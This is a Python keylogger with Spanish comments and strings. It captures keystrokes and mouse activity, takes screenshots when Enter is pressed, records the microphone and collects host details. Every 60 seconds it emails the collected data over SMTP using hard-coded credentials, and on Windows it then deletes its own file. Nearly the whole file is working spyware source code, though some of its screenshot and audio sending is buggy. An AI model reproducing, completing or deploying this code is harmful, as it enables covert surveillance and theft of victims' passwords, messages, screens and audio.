try:
    
    import logging
    import  os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob

finally:

    EMAIL_ADDRESS = "ea74d1f0e318ab"
    EMAIL_PASSWORD =  "bcd9ec4d1a356f"
    SEND_REPORT_EVERY = 60 


    class Keylogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "Keylogger iniciando..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string 
    
        def on_move(self, x, y):
            current_move = "Clic del ratón a {} {}".format(x, y)
            logging.info(current_move)
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = "Click del ratón a {} {}".format(x, y)
            logging.info(current_click)
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = "Scroll del ratón a {} {}".format(x, y)
            logging.info(current_scroll)
            self.appendlog(current_scroll)

        


        def save_data(self, key):

            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "ESPACIO"
                elif key == key.esc:
                    current_key = "ESC"
                elif key == keyboard.Key.enter:
                    current_key = "ENTER"
                    self.screenshot()
                else: 
                    current_key = " " + str(key) + " "
            
            self.appendlog(current_key)

        def send_mail(self, email, password, message):
            
            sender = "Persona privada <from@example.com>"
            receiver = "Usuario de prueba <to@example.com>"

            m = f"""\
            Asunto: Informa principal de Mailtrap
            Para: {receiver}
            Desde: {sender}

           \n"""
            
            m += message
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)

        def report(self):

            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):

            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):

            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open("sound.wav", "w")
            obj.setnchannels(1)
            obj.setsampwidth(2)
            obj.setframerate(fs)    
            myreconding = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myreconding)
            sd.wait()

            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_ADDRESS, message=obj)

        def screenshot(self):

                img = pyscreenshot.grab()
                self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

        def run(self):
            
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == "nt":

                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print("Archivo cerrado.")
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print("Archivo cerrado.")
            else:
                
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd) 
                    os.system("pkill leafpad")
                    os.system("chattr -i " + os.path.basename(__file__))
                except OSError:
                    print("Archivo cerrado. ")
    Keylogger_instance = Keylogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Keylogger_instance.run()
